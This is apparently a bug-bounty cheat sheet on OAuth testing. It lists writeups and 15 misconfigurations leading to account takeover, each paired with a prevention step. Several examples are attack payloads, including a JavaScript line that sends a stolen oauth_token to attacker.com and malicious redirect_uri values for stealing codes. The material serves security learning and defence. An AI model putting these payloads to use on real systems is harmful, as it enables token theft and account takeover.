### **OAuth Testing Scenarios**

#### **General Research**
- Check Medium for articles and writeups.
- Check GitHub for tools and repositories.
- Check Telegram for tips and discussions.
- Check X (Twitter) for tips and updates.
- Search on Google for new techniques and vulnerabilities.

#### **Writeups & References**
- DOM XSS to Account Takeover Writeup: https://thefrogsec.github.io/2024/04/06/How-we-escalated-a-DOM-XSS-to-a-sophisticated-1-click-Account-Takeover-for-8000-Part-1/
- OAuth Vulnerabilities by Payatu: https://payatu.com/blog/oauth-vulnerabilities/#1_Stealing_OAuth_Token_via_redirect_uri
- OAuth 2.0 Vulnerabilities Cheat Sheet: https://0xn3va.gitbook.io/cheat-sheets/web-application/oauth-2.0-vulnerabilities
- RFC 6749 - OAuth 2.0 Specification: https://www.rfc-editor.org/rfc/rfc6749#section-4.1.2
- OAuth 2.0 Official Documentation: https://oauth.net/2/
- Salmonsec Cheatsheet: https://salmonsec.com/cheatsheethome
- Breaking the Chain: Exploiting OAuth and Forgot Password for Account Takeover: https://www.bugcrowd.com/blog/breaking-the-chain-exploiting-oauth-and-forgot-password-for-account-takeover/
- Authentication Bypass Notion Page: https://boom-stinger-c76.notion.site/Authentication-Bypass-17853b6a0d6e80f8aea8d59e9e5dc874
- RFC 6749 - OAuth 2.0 Full Specification: https://datatracker.ietf.org/doc/html/rfc6749
- RFC 6749 - Section 1.3.2: https://datatracker.ietf.org/doc/html/rfc6749#section-1.3.2
- Authentication Bypass on Airbnb via OAuth Tokens Theft: https://www.arneswinnen.net/2017/06/authentication-bypass-on-airbnb-via-oauth-tokens-theft/
- OAuth Misconfigurations to ATO: https://sallam.gitbook.io/sec-88/web-appsec/oauth-misconfigurations/oauth-to-ato

#### **OAuth Testing Techniques**
- Brute Force to get legacy or unimplemented OAuth flows:
  - List of OAuth Providers: https://en.wikipedia.org/wiki/List_of_OAuth_providers
- Modify the `hd=` parameter:
  - Intigriti Tweet: https://x.com/intigriti/status/1383397368691789825
- Remove `email` from the scope.
- Use the Access Token of your app instead of the Auth Token of the victim app:
  - Account Takeover via Facebook Login Misconfiguration: https://ankitthku.medium.com/account-takeover-via-common-misconfiguration-in-facebook-login-a2ac8b479b3
  - HackerOne Report 1: https://hackerone.com/reports/101977
  - HackerOne Report 2: https://hackerone.com/reports/314808

---
---

### **OAuth Misconfigurations Leading to ATO**

---

#### **1. Improper Redirect URI Validation**
- **Issue**: The application does not properly validate the `redirect_uri` parameter.  
- **Exploitation**:  
  - Use a malicious `redirect_uri` to steal authorization codes or tokens.  
  - Example:  
    ```plaintext
    redirect_uri=https://attacker.com
    ```
- **Prevention**:  
  - Strictly validate the `redirect_uri` against a whitelist of allowed URIs.  

---

#### **2. Leakage of Authorization Codes**
- **Issue**: Authorization codes are exposed in URLs, logs, or browser history.  
- **Exploitation**:  
  - Intercept authorization codes from insecure channels.  
  - Example: Codes leaked in the `Referer` header or browser history.  
- **Prevention**:  
  - Use PKCE (Proof Key for Code Exchange) to secure authorization codes.  

---

#### **3. Token Leakage via Referer Header**
- **Issue**: Tokens are leaked in the `Referer` header when navigating to third-party sites.  
- **Exploitation**:  
  - Capture tokens from the `Referer` header.  
  - Example:  
    ```plaintext
    Referer: https://victim.com/?token=abc123
    ```
- **Prevention**:  
  - Use `Referrer-Policy: no-referrer` or `Referrer-Policy: strict-origin-when-cross-origin`.  

---

#### **4. Weak Token Validation**
- **Issue**: The application does not properly validate OAuth tokens.  
- **Exploitation**:  
  - Use expired or tampered tokens to gain unauthorized access.  
  - Example: Reuse tokens after they have expired.  
- **Prevention**:  
  - Validate tokens using the OAuth provider’s introspection endpoint.  

---

#### **5. Insecure Storage of Tokens**
- **Issue**: Tokens are stored in insecure locations (e.g., local storage, cookies without `HttpOnly` and `Secure` flags).  
- **Exploitation**:  
  - Steal tokens via XSS or other client-side attacks.  
  - Example:  
    ```javascript
    localStorage.getItem('oauth_token');
    ```
- **Prevention**:  
  - Store tokens securely using `HttpOnly` and `Secure` cookies.  

---

#### **6. Lack of State Parameter**
- **Issue**: The `state` parameter is missing or not validated.  
- **Exploitation**:  
  - Perform CSRF attacks to link the attacker’s account to the victim’s session.  
  - Example:  
    ```plaintext
    https://oauth-provider.com/auth?client_id=123&redirect_uri=https://victim.com&state=attacker_state
    ```
- **Prevention**:  
  - Always include and validate the `state` parameter.  

---

#### **7. Open Redirects in OAuth Flow**
- **Issue**: The application allows open redirects during the OAuth flow.  
- **Exploitation**:  
  - Redirect users to malicious sites after authentication.  
  - Example:  
    ```plaintext
    redirect_uri=https://victim.com?next=https://attacker.com
    ```
- **Prevention**:  
  - Validate and restrict redirect URIs to trusted domains.  

---

#### **8. Token Replay Attacks**
- **Issue**: Tokens can be reused or replayed.  
- **Exploitation**:  
  - Capture and reuse tokens to impersonate users.  
  - Example: Replay tokens from intercepted requests.  
- **Prevention**:  
  - Use short-lived tokens and implement token revocation.  

---

#### **9. Insufficient Scope Validation**
- **Issue**: The application does not properly validate the scope of tokens.  
- **Exploitation**:  
  - Use tokens with excessive permissions to perform unauthorized actions.  
  - Example: Use a token with `read_write` scope to modify data.  
- **Prevention**:  
  - Validate token scopes before granting access to resources.  

---

#### **10. Misconfigured CORS**
- **Issue**: The application allows cross-origin requests to OAuth endpoints.  
- **Exploitation**:  
  - Perform cross-origin attacks to steal tokens or authorization codes.  
  - Example:  
    ```javascript
    fetch('https://oauth-provider.com/token', { credentials: 'include' });
    ```
- **Prevention**:  
  - Configure CORS policies to restrict access to trusted origins.  

---

#### **11. Phishing via OAuth Consent Page**
- **Issue**: The OAuth consent page can be spoofed.  
- **Exploitation**:  
  - Trick users into granting access to malicious applications.  
  - Example: Use a fake consent page to steal credentials.  
- **Prevention**:  
  - Educate users to verify the legitimacy of consent pages.  

---

#### **12. Token Hijacking via XSS**
- **Issue**: Tokens are vulnerable to theft via XSS.  
- **Exploitation**:  
  - Inject malicious scripts to steal tokens.  
  - Example:  
    ```javascript
    document.location='https://attacker.com/?token='+localStorage.getItem('oauth_token');
    ```
- **Prevention**:  
  - Implement strong XSS protections and sanitize user inputs.  

---

#### **13. Lack of Token Binding**
- **Issue**: Tokens are not bound to the client or user session.  
- **Exploitation**:  
  - Use stolen tokens on different devices or sessions.  
  - Example: Replay tokens from one session to another.  
- **Prevention**:  
  - Implement token binding using mechanisms like DPoP (Demonstrating Proof of Possession).  

---

#### **14. Insecure Token Transmission**
- **Issue**: Tokens are transmitted over unencrypted channels (HTTP).  
- **Exploitation**:  
  - Intercept tokens via MITM attacks.  
  - Example: Capture tokens from HTTP requests.  
- **Prevention**:  
  - Always use HTTPS for token transmission.  

---

#### **15. Misconfigured Token Expiry**
- **Issue**: Tokens have excessively long expiry times.  
- **Exploitation**:  
  - Use expired tokens to maintain access.  
  - Example: Reuse tokens long after they should have expired.  
- **Prevention**:  
  - Use short-lived tokens and refresh tokens with limited lifetimes.  

---

- https://sallam.gitbook.io/sec-88/web-appsec/auth0-misconfigurations
- https://book.hacktricks.wiki/en/pentesting-web/oauth-to-account-takeover.html
- https://labs.detectify.com/writeups/account-hijacking-using-dirty-dancing-in-sign-in-oauth-flows/#current-state-and-assumptions-about-oauth-credential-leakage
